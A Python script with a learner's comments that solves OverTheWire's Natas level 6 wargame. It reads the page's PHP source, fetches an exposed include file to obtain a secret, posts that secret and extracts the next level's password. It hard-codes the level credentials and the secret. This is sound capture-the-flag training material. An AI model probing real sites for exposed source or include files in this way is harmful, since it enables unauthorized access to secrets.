#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'
"""———————————————————————————————————————"""
url = 'http://%s.natas.labs.overthewire.org/' % username
print(url) #make sure the URL works fine

"""Starting with our default stuff"""
#response = requests.get(url, auth = (username, password))
#content = response.text
#print(content) 
"""shows something interesting:
Input secret: <input name=secret><br>
<input type=submit name=submit>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
So I guess there is a text box that we can submit data to? and it appears like we can see the source code if we change our URL...sooo"""
#response = requests.get(url + "index-source.html", auth = (username, password))
#content = response.text
#print(content) 

"""I can't get this to format in sublime prettily
#I had to open it up in the web browser, but it has the below:

<?

include  "includes/secret.inc";

        if(array_key_exists("submit",  $_POST))  {
                if($secret  ==  $_POST['secret'])  {
                print  "Access  granted.  The  password  for  natas7  is  <censored>";
        }  else  {
                print  "Wrong  secret";
        }
        }
?>
Hmmm, what is include "includes/secret.inc"; ?"""
#response = requests.get(url + "includes/secret.inc", auth = (username, password))
#content = response.text
#print(content) 

"""Nice so this gives us <?$secret = "FOEIUWGHFEEUHOFUOIU";?>, so that must be what we need to submit to the application!

But how do we do that...

It looks like we could use urllib according to some stackechange posts, but also I see this page: https://www.tutorialspoint.com/python_network_programming/python_webform_submission.htm
Looks like we can make a dictionary with the data once again and pass that in our requests"""
"""session = requests.Session()
notice post here, since we're sending data and must post the secret per the first page we looked at
This doesn't seem to work by itself:"""
#response = requests.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU"}, auth = (username, password))
"""ooookay, so it's actually asking for two things above.
If you look closely it says if(array_key_exists("submit",  $_POST)) - so basically it's asking for a value "submit" to post it properly
If that exists and then it gets the value "secret" as well, it knows what to do
I had to do some additional searching to find the data=secret, this page shows an example of that: https://stackoverflow.com/questions/17509607/submitting-to-a-web-form-using-python"""
secret={ "secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}
response = requests.post(url, data = secret, auth = (username, password))
content = response.text
print(content)

######################


print(re.findall('Access granted. The password for natas7 is (.*)', content))


"""SDG"""